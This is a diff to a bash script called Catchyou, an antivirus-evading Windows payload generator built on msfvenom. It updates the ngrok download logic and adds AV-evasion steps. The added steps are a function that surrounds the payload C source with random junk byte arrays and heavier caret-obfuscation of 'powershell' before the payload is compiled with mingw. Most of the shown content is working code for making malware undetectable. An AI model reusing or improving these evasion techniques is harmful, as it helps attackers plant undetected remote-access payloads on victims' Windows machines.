@@ -1,5 +1,5 @@
 #!/bin/bash
-# Catchyou v1.0 - FUD Win MSFVenom Payload Generator
+# Catchyou v1.1 - FUD Win MSFVenom Payload Generator
 # coded by: github.com/thelinuxchoice/catchyou
 # twitter: @linux_choice
 # You can use any part from this code, giving me the credits. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/.
@@ -18,7 +18,7 @@ printf "\e[1;91m    \______  (____  /__|  \___  >___|  / \e[0m\e[1;93m / ____|\_
 printf "\e[1;91m           \/     \/          \/     \/  \e[0m\e[1;93m \/                   \e[0m\n"
 
 printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m           FUD Win MSFVenom Payload Generator  \e[0m        \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.0 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.1 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
 printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           github.com/thelinuxchoice/catchyou          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
 printf "\n"
 printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
@@ -72,7 +72,7 @@ command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not inst
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
-arch3=$(uname -a | grep -o '64bit' | head -n1)
+arch3=$(uname -a | grep -o 'amd64' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
@@ -85,7 +85,7 @@ printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget
 exit 1
 fi
 
-elif [[ $arch3 == *'64bit'* ]] ; then
+elif [[ $arch3 == *'amd64'* ]] ; then
 
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
 
@@ -320,6 +320,40 @@ fi
 
 }
 
+function generatePadding {
+
+    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)
+
+    counter=0
+    randomNumber=$((RANDOM%${randomness}+23))
+    while [  $counter -lt $randomNumber ]; do
+        echo ""
+	randomCharnameSize=$((RANDOM%10+7))
+        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
+	echo "unsigned char ${randomCharname}[]="
+    	randomLines=$((RANDOM%20+13))
+	for (( c=1; c<=$randomLines; c++ ))
+	do
+		randomString="\""
+		randomLength=$((RANDOM%11+7))
+		for (( d=1; d<=$randomLength; d++ ))
+		do
+			randomChar1=${paddingArray[$((RANDOM%15))]}
+			randomChar2=${paddingArray[$((RANDOM%15))]}
+			randomPadding=$randomChar1$randomChar2
+	        	randomString="$randomString\\x$randomPadding"
+		done
+		randomString="$randomString\""
+		if [ $c -eq ${randomLines} ]; then
+			echo "$randomString;"
+		else
+			echo $randomString
+		fi
+	done
+        let counter=counter+1
+    done
+}
+
 payload() {
 
 
@@ -339,11 +373,41 @@ exit 1
 fi
 
 enc=$z$q 
-msf=$(cat $payload_name.bat | sed 's/\%COMSPEC\% \/b \/c //g' |sed 's/\//\\\//g' | sed 's/powershell/power^shell/g')
+msf=$(cat $payload_name.bat | sed 's/\%COMSPEC\% \/b \/c //g' |sed 's/\//\\\//g' | sed 's/powershell/p^o^wer^sh^ell/g')
 
-sed -f - src/src.c > $X.$q << EOF
+sed -f - src/src2.c > $X.$q << EOF
 s/payload/${msf}/g
 EOF
+
+generatePadding > padding.c
+
+cat src/src1.c > $X
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+
+
+cat $X.$q >> $X
+
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+cat padding.c >> $X
+generatePadding > padding.c
+mv $X $X.c
+
+
+
 rm -rf $payload_name.bat
 printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Building payload\e[0m\n"
 i686-w64-mingw32-gcc $X$enc -o "$payload_name".exe 
